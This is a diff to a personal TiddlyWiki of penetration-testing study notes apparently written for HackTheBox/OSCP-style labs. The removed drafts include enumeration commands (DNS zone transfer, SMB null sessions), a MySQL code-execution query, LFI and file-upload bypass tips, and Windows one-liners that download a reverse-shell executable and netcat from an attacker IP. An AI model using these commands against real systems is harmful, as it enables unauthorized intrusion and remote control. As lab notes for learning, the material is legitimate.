@@ -283,10 +283,6 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 
 <li>Draft of 'LinEnum'</li>
 
-<li>Draft of 'Network Services'</li>
-
-<li>Draft of 'Penetration Testing Framework'</li>
-
 <li>Entertainment</li>
 
 <li>Exploitation</li>
@@ -9684,7 +9680,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211027101744341" list="[[Cyber Security]] [[Draft of 'Penetration Testing Framework']] [[Draft of 'Network Services']] [[Domain Name System]] Scanning CrappyMakerProgrammer" modified="20211027131713158" title="$:/StoryList">
+<div created="20211027101744341" list="[[Cyber Security]] [[Penetration Testing Framework]] Scanning CrappyMakerProgrammer" modified="20211027131713158" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -10741,212 +10737,6 @@ dig axfr @10.10.10.13 cronos.htb
 <div modified="20210913120411045" title="Draft of 'LinEnum'">
 <pre></pre>
 </div>
-<div created="20210820120924872" draft.of="Network Services" draft.title="Network Services" modified="20211027131710269" title="Draft of 'Network Services'">
-<pre>! Web Server
-
-[[Web Development]]
-
-Sample Services
-
-# [[NextCloud]]
-# [[Wordpress]] 
-# [[Tomcat]]
-# [[Git]]
-
-
-
-! DNS Enumeration
-
-[[Domain Name System]]
-
-
-
-
-! FTP
-# Server: `python3 -m pyftpdlib -w`
-# Mount: `sudo curlftpfs 192.168.1.124:2121 /mnt/ -o allow_other`
-## https://wiki.archlinux.org/title/CurlFtpFS
-## Edit `/etc/fuse.conf`  and add `user_allow_other` ([[reference|https://unix.stackexchange.com/questions/17402/why-does-root-get-permission-denied-when-accessing-fuse-directory]])
-# Connect: `ftp &lt;IP&gt;`
-# Download `wget -r ftp://172.16.37.234:40121 --user=ftpuser --password=ftpassword`
-
-For FTP try anonymous login (or credentials if any)
-
-```
-ftp &lt;ip&gt; &lt;port&gt;
-```
-
-
-
-! SSH
-
-Connect to shell
-`ssh &lt;user&gt;@&lt;ip&gt; -p &lt;port, usually 22&gt;`
-
-# Add `-oKexAlgorithms=+diffie-hellman-group1-sha1` if `no matching key exchange found` [[*|https://unix.stackexchange.com/questions/340844/how-to-enable-diffie-hellman-group1-sha1-key-exchange-on-debian-8-0/340853]]
-# Transfer Files: `scp &lt;local_file&gt; &lt;user&gt;@&lt;ip&gt;:&lt;result_file&gt;` [[*|https://linuxize.com/post/how-to-use-scp-command-to-securely-transfer-files/]]
-
-! VPN
-Wireguard works
-https://www.pivpn.io/
-
-! MySQL
-
-Usually at port 3306
-
-|Action | Command|
-|Connect | `mysql -u&lt;username&gt; -p&lt;password&gt; -h &lt;ip_address&gt;`|
-
-https://book.hacktricks.xyz/pentesting/pentesting-mysql 
-
-```
-show databases;
-use &lt;database&gt;;
-show tables;
-describe &lt;table_name&gt;;
-select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
-select user,file_priv from mysql.user where user='root'; #File privileges
-select version(); #version
-select @@version(); #version
-select user(); #User
-select database(); #database name
-
-#Try to execute code
-select do_system('id');
-```
-
-! Samba File Share
-
-[[SMB File Sharing]]
-
-! SOCKS Proxy Server
-
-Referenced from [[here|https://howto.lintel.in/setup-socks-proxy-linux/]]
-
-Just need to clone [[this repo|https://github.com/rofl0r/microsocks]], `make` and run `./microsocks` to have a server start on port 1080
-
-To connect to it, you can do the following
-
-|Program|Steps|
-|`proxychains4` for Linux|&lt;ol&gt;&lt;li&gt;Edit `/etc/proxychains.conf` under `[ProxyList]`, adding `socks5 &lt;ip&gt; &lt;port&gt;` right below the line. &lt;/li&gt;&lt;li&gt;The IP address must be numeric (if you have a domain name, just ping to get it's IP address)&lt;/li&gt;&lt;li&gt;Run `proxychains4 &lt;command&gt;`&lt;/li&gt;&lt;/ol&gt;|
-|Android|Install [[TunProxy|https://github.com/raise-isayan/TunProxy]], [[SocksDroid|https://play.google.com/store/apps/details?id=net.typeblog.socks]] or other Proxy Tunnelling VPN|</pre>
-</div>
-<div created="20210927160738058" draft.of="Penetration Testing Framework" draft.title="Penetration Testing Framework" modified="20211027131005589" title="Draft of 'Penetration Testing Framework'">
-<pre>! Overview
-
-This is a basic Penetration Testing Outline I made
-
-! General Enumeration
-
-[[Scanning]]
-
-! Service Enumeration
-
-# For each service
-## Access, Read &amp; Write if possible
-## Using the Version number from scans, find [[Common Vulnerabilities and Exposures]]
-## If You don't know the service (or nmap also doesn't), try web browser
-
-
-!! FTP, SMB
-
-[[Network Services]]
-
-
-
-!! Web Hacking
-
-!!! Directory Enumeration
-
-```
-dirb &lt;url&gt;
-gobuster dir -k -x html,js,php,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u &lt;URL&gt;
-```
-
-Look through at log down everything on everypage. Find all clues.
-
-!!! SQL Injection
-
-# Whenever you find a user page, bruteforce SQL injection payloads.
-## https://github.com/payloadbox/sql-injection-payload-list
-# If it is something like ?id=1, you can try enumerating all the ids by doing id=2, id=3
-## Can move on to SQL Injection (eg. UNION)
-
-!! File Upload Vulnerability
-
-# Upload a file through website/ FTP if possible
-# Access the payload through the web browser to run the php code
-
-To bypass mandate of extension, can try name.php.jpg for example. It will run as a php file [[*|https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload]]
-
-!!! Local File Inclusion
-
-If there is a POST/GET parameter with a path, you can try Directory inclusion by `../../../../../etc/passwd` or something
-
-!!! Content Management Systems
-
-# Vulnerability Scanning
-
-! Exploitation
-
-# [[Password Cracking]]
-# [[OSCP Style Windows Buffer Overflow]]
-# [[Getting Shells]]
-
-! Privilege Escalation
-
-[[Privilege Escalation]]
-
-!! Linux
-
-
-! Post Exploitation
-
-
-# Upload privilege esclation scripts to run
-
-
-!! File Transfers
-
-!!! Windows
-
-```
-echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
-echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
-echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
-echo Err.Clear &gt;&gt; wget.vbs
-echo Set http = Nothing &gt;&gt; wget.vbs
-echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
-echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
-echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
-echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
-echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs
-echo http.Send &gt;&gt; wget.vbs
-echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
-echo Set http = Nothing &gt;&gt; wget.vbs
-echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
-echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
-echo strData = &quot;&quot; &gt;&gt; wget.vbs
-echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs
-echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
-echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
-echo Next &gt;&gt; wget.vbs
-echo ts.Close &gt;&gt; wget.vbs
-```
-
-```
-cscript wget.vbs http://10.10.14.12:8000/1234_rev.exe rev.exe
-```
-
-
-```
-powershell -c &quot;wget http://10.10.14.4:8000/nc.exe -Outfile nc.exe&quot;
-```</pre>
-</div>
 <div created="20191105030432236" modified="20191105034127657" title="Entertainment">
 <pre>! Anime &amp; Manga
 Check [[MyAnimeList|https://myanimelist.net/profile/Hackin7]]
@@ -11405,7 +11195,7 @@ Check the Google Play Console
 [[Publishing Apps on Google Play]]
 </pre>
 </div>
-<div created="20210820120924872" modified="20211027131148471" title="Network Services">
+<div created="20210820120924872" modified="20211027131755113" title="Network Services">
 <pre>! Web Server
 
 [[Web Development]]
@@ -11418,40 +11208,12 @@ Sample Services
 # [[Git]]
 
 
+
 ! DNS Enumeration
 
-DNS Zone Transfer
-
-Some other scripts can be found [[here|https://securitytrails.com/blog/dns-enumeration]]
-
-# `dig axfr @10.10.10.13 cronos.htb`
-# `host &lt;ip or hostname&gt; &lt;IP of server&gt;`
-## Can automate this using bash eg. `for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v &quot;not found&quot;`
-## Add `-l` to list all hosts in a domain, using AXFR
-## Add `-t &lt;record&gt;` to find out more
-### NS - Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
-### A - Also known as a host record, the “a record” contains the IP address of a hostname (such as www.megacorpone.com).
-### MX - Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
-### PTR - Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.
-### CNAME - Canonical Name Records are used to create aliases for other host records.
-### TXT - Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.
-# dnsrecon
-## for more check https://hackersonlineclub.com/dnsrecon-to-use-dns-information-gathering/
+[[Domain Name System]]
 
 
-Pentesting
-
-Enumerate the host. Use domain names such as those
-
-# Involving the box name, platform and other clues
-## `cronos.htb` : HackTheBox name is `cronos`,
-# Email Address: 
-## `involve@friendzoneportal.red` -&gt; `friendzoneportal.red`
-## Cutting the words, eg. `friendzoneportal.red` -&gt; `friendzone.red`
-
-```
-dig axfr @10.10.10.13 cronos.htb
-```
 
 
 ! FTP
@@ -11745,7 +11507,7 @@ gpg -d credential.pgp
 
 https://book.hacktricks.xyz/forensics/basic-forensic-methodology/specific-software-file-type-tricks/pdf-file-analysis</pre>
 </div>
-<div created="20210927160738058" modified="20211027130616121" title="Penetration Testing Framework">
+<div created="20210927160738058" modified="20211027132351497" title="Penetration Testing Framework">
 <pre>! Overview
 
 This is a basic Penetration Testing Outline I made
@@ -11761,40 +11523,10 @@ This is a basic Penetration Testing Outline I made
 ## Using the Version number from scans, find [[Common Vulnerabilities and Exposures]]
 ## If You don't know the service (or nmap also doesn't), try web browser
 
-!! DNS Server
 
-Enumerate the host. Use domain names such as those
-
-# Involving the box name, platform and other clues
-## `cronos.htb` : HackTheBox name is `cronos`,
-# Email Address: 
-## `involve@friendzoneportal.red` -&gt; `friendzoneportal.red`
-## Cutting the words, eg. `friendzoneportal.red` -&gt; `friendzone.red`
-
-```
-dig axfr @10.10.10.13 cronos.htb
-```
-
-!! FTP, SMB
 
 [[Network Services]]
 
-For FTP try anonymous login (or credentials if any)
-
-```
-ftp &lt;ip&gt; &lt;port&gt;
-```
-
-For SMB, try Null Shares
-
-```
-IP=10.10.10.123
-smbmap -H $IP # List shares &amp; their permissions
-smbclient -N -L //$IP # List permissions of shares (Null Session)
-nmap --script smb-enum-shares.nse -p445 $IP
-smbclient //&lt;ip&gt;/&lt;share&gt; -N
-enum4linux -a $IP
-```
 
 
 !! Web Hacking
@@ -11840,14 +11572,9 @@ If there is a POST/GET parameter with a path, you can try Directory inclusion by
 
 [[Privilege Escalation]]
 
-!! Linux
-
-
 ! Post Exploitation
 
-
 # Upload privilege esclation scripts to run
-
 
 !! File Transfers
 
